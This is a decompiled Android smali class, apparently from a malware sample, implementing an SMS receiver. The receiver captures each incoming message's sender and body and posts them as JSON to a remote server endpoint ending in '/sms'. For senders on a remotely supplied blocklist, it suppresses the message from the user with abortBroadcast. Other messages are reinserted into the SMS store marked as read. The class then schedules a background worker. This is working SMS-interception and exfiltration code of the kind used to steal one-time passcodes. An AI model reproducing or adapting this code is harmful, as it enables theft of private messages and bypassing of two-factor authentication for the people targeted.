.class public Lgqegwqg/bbebebefff/asdcdsac/smsreciver;
.super Landroid/content/BroadcastReceiver;
.source "sourcefile"


# static fields
.field public static final synthetic a:I


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public a()Lorg/json/JSONArray;
    .locals 4

    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    :try_start_0
    invoke-static {}, Lo/a/a/g/b;->a()Lo/a/a/g/b;

    move-result-object v1

    const-string v2, "blocklist"

    .line 1
    iget-object v1, v1, Lo/a/a/g/b;->b:Landroid/content/SharedPreferences;

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "RRRrr"

    .line 2
    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    return-object v2

    :catch_0
    move-exception v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "01012341234"

    invoke-virtual {v0, v1}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    return-object v0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 16

    move-object/from16 v1, p0

    const-string v2, "body"

    const-string v3, "getsms"

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v4, "pdus"

    invoke-virtual {v0, v4}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    move-object v4, v0

    check-cast v4, [Ljava/lang/Object;

    array-length v5, v4

    const/4 v7, 0x0

    :goto_0
    if-ge v7, v5, :cond_7

    aget-object v0, v4, v7

    check-cast v0, [B

    invoke-static {v0}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v0

    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v9

    const-string v0, "egwewewgewgwegwegewg"

    invoke-static {v0, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver;->a()Lorg/json/JSONArray;

    move-result-object v0

    const/4 v10, 0x0

    const/4 v11, 0x0

    :goto_1
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v12

    if-ge v10, v12, :cond_1

    invoke-virtual {v0, v10}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v11, 0x1

    :cond_0
    add-int/lit8 v10, v10, 0x1

    goto :goto_1

    :cond_1
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v10, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v10, ""

    const-string v12, "event"

    if-eqz v0, :cond_6

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v13, "SMS"

    invoke-virtual {v0, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v13, "sender"

    invoke-virtual {v0, v13, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0, v2, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    .line 1
    sget-object v14, Lk/a/a/q;->e:Ljava/lang/String;

    .line 2
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "/sms"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 3
    new-instance v14, Lj/b/b/c$f;

    invoke-direct {v14, v13}, Lj/b/b/c$f;-><init>(Ljava/lang/String;)V

    .line 4
    sget-object v13, Lg/v/a;->c:Lj/b/f/d;

    if-nez v13, :cond_2

    new-instance v13, Lj/b/e/a;

    new-instance v15, Lcom/google/gson/Gson;

    invoke-direct {v15}, Lcom/google/gson/Gson;-><init>()V

    invoke-direct {v13, v15}, Lj/b/e/a;-><init>(Lcom/google/gson/Gson;)V

    sput-object v13, Lg/v/a;->c:Lj/b/f/d;

    :cond_2
    sget-object v13, Lg/v/a;->c:Lj/b/f/d;

    .line 5
    check-cast v13, Lj/b/e/a;

    .line 6
    invoke-static {v13}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    :try_start_2
    iget-object v13, v13, Lj/b/e/a;->a:Lcom/google/gson/Gson;

    invoke-virtual {v13, v0}, Lcom/google/gson/Gson;->h(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move-object v0, v10

    .line 7
    :goto_2
    iput-object v0, v14, Lj/b/b/c$f;->d:Ljava/lang/String;

    const-string v0, "x-uid"

    .line 8
    sget-object v13, Lk/a/a/q;->a:Ljava/lang/String;

    .line 9
    iget-object v15, v14, Lj/b/b/c$f;->e:Ljava/util/HashMap;

    invoke-virtual {v15, v0}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Ljava/util/List;

    if-nez v15, :cond_3

    new-instance v15, Ljava/util/ArrayList;

    invoke-direct {v15}, Ljava/util/ArrayList;-><init>()V

    iget-object v6, v14, Lj/b/b/c$f;->e:Ljava/util/HashMap;

    invoke-virtual {v6, v0, v15}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_3
    invoke-interface {v15, v13}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    invoke-interface {v15, v13}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 10
    :cond_4
    sget-object v0, Lj/b/b/f;->g:Lj/b/b/f;

    .line 11
    iput-object v0, v14, Lj/b/b/c$f;->a:Lj/b/b/f;

    .line 12
    new-instance v0, Lj/b/b/c;

    invoke-direct {v0, v14}, Lj/b/b/c;-><init>(Lj/b/b/c$f;)V

    .line 13
    new-instance v6, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$a;

    invoke-direct {v6, v1}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$a;-><init>(Lgqegwqg/bbebebefff/asdcdsac/smsreciver;)V

    const/4 v13, 0x2

    .line 14
    iput v13, v0, Lj/b/b/c;->i:I

    iput-object v6, v0, Lj/b/b/c;->t:Lj/b/f/c;

    invoke-static {}, Lj/b/g/b;->b()Lj/b/g/b;

    move-result-object v6

    invoke-virtual {v6, v0}, Lj/b/g/b;->a(Lj/b/b/c;)Lj/b/b/c;

    if-eqz v11, :cond_5

    .line 15
    invoke-virtual/range {p0 .. p0}, Landroid/content/BroadcastReceiver;->abortBroadcast()V

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v6, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$b;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    move-object/from16 v11, p1

    :try_start_4
    invoke-direct {v6, v1, v11, v9}, Lgqegwqg/bbebebefff/asdcdsac/smsreciver$b;-><init>(Lgqegwqg/bbebebefff/asdcdsac/smsreciver;Landroid/content/Context;Ljava/lang/String;)V

    const-wide/16 v8, 0xbb8

    invoke-virtual {v0, v6, v8, v9}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    goto :goto_3

    :cond_5
    move-object/from16 v11, p1

    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    const-string v6, "address"

    invoke-virtual {v0, v6, v8}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2, v9}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "read"

    sget-object v8, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-virtual {v0, v6, v8}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Boolean;)V

    const-string v6, "date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-static {v8, v9}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v8

    invoke-virtual {v0, v6, v8}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const-string v8, "content://sms/"

    invoke-static {v8}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v8

    invoke-virtual {v6, v8, v0}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    goto :goto_3

    :cond_6
    move-object/from16 v11, p1

    :goto_3
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 16
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 17
    invoke-virtual {v0, v3}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    .line 18
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    .line 19
    invoke-virtual {v0, v12, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "type"

    invoke-virtual {v0, v6, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 20
    new-instance v6, Lg/z/e;

    invoke-direct {v6, v0}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v6}, Lg/z/e;->c(Lg/z/e;)[B

    .line 21
    new-instance v0, Lg/z/l$a;

    const-class v8, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {v0, v8}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 22
    iget-object v8, v0, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v6, v8, Lg/z/u/s/o;->e:Lg/z/e;

    .line 23
    iget-object v6, v0, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v6, v3}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 24
    invoke-virtual {v0}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    .line 25
    invoke-static {v6}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v6

    .line 26
    invoke-virtual {v6, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_5

    :catch_1
    move-exception v0

    goto :goto_4

    :catch_2
    move-exception v0

    move-object/from16 v11, p1

    :goto_4
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "eee"

    invoke-static {v6, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :goto_5
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_0

    :cond_7
    return-void
.end method
